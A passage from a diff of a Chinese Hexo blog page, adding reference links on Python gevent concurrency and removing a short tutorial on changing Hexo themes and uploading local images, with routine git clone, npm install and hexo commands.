+<p><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/73ccb425a710">https://www.jianshu.com/p/73ccb425a710</a></p>
+<p>gevent官方文档</p>
+<p><a target="_blank" rel="noopener" href="http://www.gevent.org/contents.html">http://www.gevent.org/contents.html</a></p>
+<p>Python gevent高并发（限制最大并发数、协程池）</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/u012206617/article/details/108059173">https://blog.csdn.net/u012206617/article/details/108059173</a></p>
+<p>kill掉全部的greenlet</p>
+<p><a target="_blank" rel="noopener" href="https://www.cnpython.com/qa/135874">https://www.cnpython.com/qa/135874</a></p>
 </blockquote>
-<h3 id="主题更换"><a href="#主题更换" class="headerlink" title="主题更换"></a>主题更换</h3><p><a target="_blank" rel="noopener" href="https://hexo.io/themes/">https://hexo.io/themes/</a></p>
-<p><img src="https://gitee.com/qwrdxer/img2/raw/master/image-20210416122102370.png" alt="image-20210416122102370"></p>
-<p>点击图片可预览，点击下面的蓝色字体进入github页面</p>
-<p>本机进入<code>themes</code>文件夹，git下载即可, 如</p>
-<p>git clone <a target="_blank" rel="noopener" href="https://github.com/mulder21c/hexo-theme-amorfati.git">https://github.com/mulder21c/hexo-theme-amorfati.git</a></p>
-<p><img src="https://gitee.com/qwrdxer/img2/raw/master/image-20210416122304877.png" alt="image-20210416122304877"></p>
-<p>记住文件名，编辑根目录下的<code>_config.yml</code>文件，更新theme的值为对应的文件夹名即可(注意空格)</p>
-<p><img src="https://gitee.com/qwrdxer/img2/raw/master/image-20210416122430800.png" alt="image-20210416122430800"></p>
-<p>输入命令 <code>hexo g -d</code> 即可更换完成</p>
-<p>若主题仍未更换，可能是浏览器换成的问题。</p>
-<h3 id="本地图片上传"><a href="#本地图片上传" class="headerlink" title="本地图片上传"></a>本地图片上传</h3><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/ayuayue/article/details/109198493">https://blog.csdn.net/ayuayue/article/details/109198493</a></p>
-<p>设置post_asset_folder  为 true, 安装插件 asset-image<br>npm install <a target="_blank" rel="noopener" href="https://github.com/CodeFalling/hexo-asset-image">https://github.com/CodeFalling/hexo-asset-image</a><br>typora 设置图片为本地上传、优先使用相对路径<br>hexo clean &amp;&amp; hexo generate &amp;&amp; hexo s 运行查看</p>
-<h3 id="参考博客"><a href="#参考博客" class="headerlink" title="参考博客"></a>参考博客</h3><p><strong>hexo添加图片</strong></p>
-<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/u010996565/article/details/89196612">https://blog.csdn.net/u010996565/article/details/89196612</a></p>
-<p><strong>hexo文章分类</strong></p>
-<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/maosidiaoxian/article/details/85220394">https://blog.csdn.net/maosidiaoxian/article/details/85220394</a></p>
-<p><strong>hexo 自动文章分类</strong></p>
-<p><a target="_blank" rel="noopener" href="https://blog.eson.org/pub/e2f6e239/">https://blog.eson.org/pub/e2f6e239/</a></p>
-<p>国内git无法正常使用</p>
-<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/e1sewhere/p/16574118.html">https://www.cnblogs.com/e1sewhere/p/16574118.html</a></p>
 
       
        <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。可以在下面评论区评论，也可以邮件至 1944270374@qq.com </span>
